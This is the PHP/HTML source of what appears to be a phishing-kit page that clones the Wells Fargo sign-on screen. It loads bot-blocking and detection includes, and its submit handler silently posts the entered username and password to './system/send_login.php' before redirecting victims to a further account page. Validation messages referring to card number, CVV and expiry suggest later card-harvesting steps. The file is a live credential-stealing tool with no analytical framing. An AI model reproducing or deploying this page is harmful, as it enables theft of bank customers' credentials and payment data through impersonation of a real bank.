<?php





session_start();
error_reporting(0);

include '../blocker.php';
include "./system/blocker.php";
include "./system/detect.php";


?>

<!DOCTYPE html>
<html lang="en">
    <head>
        


    <link rel="icon" type="image/x-icon" href="./style/css/tttt.jpg">


<style>
.ddddaaaaa {
    margin-top: 10px;
    height: 45px;
    width: 200px;
    padding-left: 10px;
    margin-right: 18px;
    font-weight: 400;
    text-decoration: none;
    font-size: 13px;
    color: #44464a;
    border-radius: 2px;
    border: 1px solid #cfd1d7;
}

</style>
	
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>



	
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Pragma: no-cache"/>
		<meta http-equiv="Cache Control" content="no-store" />
		<meta http-equiv="Cache Control: no-store" />
		<meta http-equiv="Expires" content="-1" />
	


<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>

<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
                <meta name="description" content="Click here to sign on to your Wells Fargo account(s)."/>
          

<link rel="stylesheet" href="./style/css/global.css">
<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
        </style>
    </head>
    <body id="body" theme="ssep" platform="m" contextPath="#" >
        <a href="#skip" class="skipLink">main content</a>
        <header isJukebox="" divested="" origin="cob">
	<div>
		<a href="#"><img src="./style/css/logo.png" class="logo" alt="Wells Fargo" origin="cob"/></a><ul data-id="search">
			<li><a href="#">Apply</a></li><li><a href="#">Locations</a></li><li><a href="#">Customer Service</a></li><li>
					<div data-id="searchBox">
						<form action="#" method="get" id="frmSearch">
							<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search" />
							<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0"/>
						</form>
					</div>
				</li>
			</ul>
		<ul data-id="headerLinks">
			<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="#">Home</a></li></ul>
	</div>
</header>
<section data-id="hero" role="presentation">
                <img src="./style/css/logobody.png" alt="" aria-hidden="true"/>
            </section>
        <main>




<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#Signonbank").bind("invalid-form.validate", function() {
			$("#errorSignonbank").html("<div class='alert' aria-atomic='true' role='alert' tabindex='-1'><img src='./style/css/ss.png' height='16' width='16' alt='Error' /><strong>  Please check your information and try again.</strong></div>");})




  $("form[name='Signonbank']").validate({
    
	errorContainer: $("#errorSignonbank"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",




expdate: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 csc: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Card Number is required!",
        minlength: "Please check your Card Number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {


					$.post("./system/send_login.php?ajax", $("#Signonbank").serialize(), function(result) {
                            setTimeout(function() {





                                $(location).attr("href", "./Myaccount?id=Myaccount");
                            });
                    });
    }
  });
});

</script>




            <form id="Signonbank" name="Signonbank" action="#"  method="POST" >
                <noscript><div class="noscriptmsg">You must enable JavaScript to sign on<a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="Sign On to View Your Accounts" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Sign On to View Your Accounts</h1>
		<div id="errorSignonbank">
		



		</div>
	<p class="copy" origin="cob">Enter your username and password to securely verify your
			Wells Fargo
			accounts online.</p>
		<div data-id="destination">
			<div class="enh-select">
			<select name="destination" id="destination" title="Select a destination" onchange="updateCustomSelect()">
				<option selected="selected" value="AccountSummary" onclick="updateCustomSelect()">Account Summary</option>
				<option value="Transfer">Transfer</option>
				<option value="BillPay">Bill Pay</option>
				<option value="brokerage">Brokerage</option>
				<option value="Trade">Trade</option>
				<option value="MessageAlerts">Messages &amp; Alerts</option>
			</select>
			</div>
		</div>
	<div data-id="inputContainer">
		<label id="usernamebanklabel" for="usernamebank">Username</label><br>
		<input class="ddddaaaaa"  required="required"    aria-required="true" type="text" id="usernamebank" name="usernamebank" value="" maxlength="14" class="OneLinkNoTx" autocorrect="off" autocapitalize="off"/>
			<div id="saveUsernamePopup" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameTitle" aria-describedby="saveUsernameDescription" data-id="saveUsernamePopup">
			<span>Beginning of popup</span>
			<h2 id="saveUsernameTitle">Notice</h2>
			<p id="saveUsernameDescription">For your security, we do not recommend using this feature on a shared device.</p>
			<img data-id="saveUsernameArrow" src="./style/css/ad.png" alt="" aria-hidden="true"/>
			<span>End of popup</span>
			<img tabindex="0" data-id="saveUsernameClose" onclick="LoginForm.events.saveUsernamePopup.onclick()" onKeyUp="LoginForm.events.saveUsernamePopup.onKeyUp()" role="button" src="./style/css/sdasd.png" alt="close dialog" aria-label="close dialog"/>
		</div>
	</div>
	<div data-id="inputContainer">
		<label id="passwordbanklabel" for="passwordbank">Password</label><br>
		<input  required="required"  aria-required="true" type="password" id="passwordbank" name="passwordbank" value="" maxlength="32" autocorrect="off" autocapitalize="off"/>
	</div>
	<div class="clear-both" data-id="inputContainer">
				</div>
	<div class="block-display clear-both">
		<div data-id="forgotEnrollLinks" origin="cob">
			<a href="#" data-id="forgotUsername" origin="cob">Forgot Password/Username?</a>
						<span data-id="linkSeparator">|</span>
						<a href="#" data-id="forgotUsername">Enroll Now</a>
							</div>
		<input type="submit" name="continue" value="Sign On" data-id="submit" class="button cob" origin="cob"/>
			</div>
</section>
<aside>
                    <hr/>
                    <section class="aside-group" data-id="relatedInformation" aria-label="related information">
	<h2>Related Information</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Enrollment FAQs</a></li><li><img src="./style/css/sssssaa.png"  alt="" aria-hidden="true"/> <a href="#">Online Security Guarantee</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Privacy, Security and Legal</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Online Access Agreement</a></li></ul>
</section>
<section class="aside-group" data-id="otherServices" aria-label="other services">
	<h2>Other Services</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Applications In Progress</a></li>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Credit Card Rewards</a></li>
	</ul>
</section>
</aside>

<section data-id="submitContainer">
                </section>
            </form>
        </main>
<div data-id="footerSeparator"></div>
        <footer>
            <div>
	<nav role="navigation">
		<div>
			<ul data-id="links">
				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
		</div>
	</nav>
</div>
<div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">&copy; 1999 - 2021 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</footer>

   

            <!--TMS include ends-->
        </body>
</html>